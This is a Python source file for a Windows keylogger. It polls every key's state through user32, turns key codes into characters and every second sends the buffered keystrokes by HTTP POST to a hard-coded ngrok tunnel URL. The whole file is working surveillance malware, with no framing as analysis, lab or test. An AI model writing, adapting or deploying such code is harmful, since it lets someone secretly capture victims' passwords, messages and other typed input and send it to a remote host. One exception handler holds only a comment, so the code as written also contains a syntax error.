import ctypes
import time
import requests

ngrok_url = 'https://miserably-probable-starfish.ngrok-free.app'

user32 = ctypes.windll.user32

def getKey(code):
    asciiTable = {
        "8": "[BACKSPACE]", "9": "[TAB]", "13": "[ENTER]",
        "16": "[SHIFT]", "17": "[CTRL]", "18": "[ALT]",
        "20": "[CAPSLOCK]", "27": "[ESC]", "32": " ",
        "37": "[LEFT]", "38": "[UP]", "39": "[RIGHT]", "40": "[DOWN]",
        "48": "0", "49": "1", "50": "2", "51": "3", "52": "4",
        "53": "5", "54": "6", "55": "7", "56": "8", "57": "9",
        "65": "A", "66": "B", "67": "C", "68": "D", "69": "E",
        "70": "F", "71": "G", "72": "H", "73": "I", "74": "J",
        "75": "K", "76": "L", "77": "M", "78": "N", "79": "O",
        "80": "P", "81": "Q", "82": "R", "83": "S", "84": "T",
        "85": "U", "86": "V", "87": "W", "88": "X", "89": "Y",
        "90": "Z", "186": ";", "187": "=", "188": ",", "189": "-",
        "190": ".", "191": "/", "192": "`", "219": "[", "220": "\\",
        "221": "]", "222": "'"
    }
    return asciiTable.get(code, "")

def main():
    buffer = []
    last_sent = time.time()

    while True:
        for i in range(256):
            if user32.GetAsyncKeyState(i) & 0x8000:
                key = getKey(str(i))
                if user32.GetKeyState(0x14) & 0x0001 == 0:
                    key = key.lower()
                if key:
                    buffer.append(key)

        if time.time() - last_sent >= 1.0:
            if buffer:
                try:
                    joined_keys = ''.join(buffer)
                    requests.post(ngrok_url, data={'message': joined_keys})
                    # print(f"Sent: {joined_keys}")
                    buffer.clear()
                except Exception as e:
                    # print(f"Error sending keys: {e}")
            last_sent = time.time()

        time.sleep(0.01)

if __name__ == "__main__":
    main()

